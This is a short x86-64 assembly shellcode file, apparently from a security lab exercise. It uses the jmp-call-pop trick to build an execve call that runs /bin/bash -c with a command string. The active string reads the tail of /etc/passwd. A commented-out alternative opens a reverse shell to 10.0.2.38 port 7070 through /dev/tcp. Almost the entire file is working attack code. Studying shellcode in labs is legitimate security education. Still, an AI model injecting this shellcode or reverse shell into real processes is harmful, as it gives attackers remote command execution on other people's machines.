ARGV equ 72

section .text
  global _start
    _start:
	BITS 64
	jmp short two
    one:
 	pop rbx             ; Get the address of the data

        ; Add zero to each of string
 	xor rax, rax
 	mov [rbx+9],  al    ; terminate the /bin/bash string
 	mov [rbx+12], al    ; terminate the -c string
 	mov [rbx+ARGV-1], al    ; terminate the reverse shell string

        ; Construct the argument arrays
 	mov [rbx+ARGV], rbx     ; argv[0]  = "/bin/bash"
        lea rcx, [rbx+10]   
 	mov [rbx+ARGV+8], rcx   ; argv[1]  = "-c"
        lea rcx, [rbx+13]   
 	mov [rbx+ARGV+16], rcx  ; argv[2]  = the reverse shell string
 	mov [rbx+ARGV+24], rax  ; argv[3]  = 0

        mov rdi, rbx        ; rdi = command string
 	lea rsi, [rbx+ARGV]   ; rsi = argv[]
        xor rdx, rdx        ; rdx = 0
 	xor rax, rax
 	mov al,  0x3b
 	syscall
     two:
        call one                                                                   
        db '/bin/bash*'
        db '-c*'
        db '/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *'
        ; The * at the end of this line is a position marker          *
        ; We can put any command or commands in the string. Don't move the
        ; position of the *, or we have to change the value for ARGV on the 1st line.
        db 'AAAAAAAA'   ; Place holder for argv[0] --> "/bin/bash"
        db 'BBBBBBBB'   ; Place holder for argv[1] --> "-c"
        db 'CCCCCCCC'   ; Place holder for argv[2] --> the command string
        db 'DDDDDDDD'   ; Place holder for argv[3] --> NULL

       ;db '/bin/bash -i >/dev/tcp/10.0.2.38/7070 0<&1 2>&1           *'

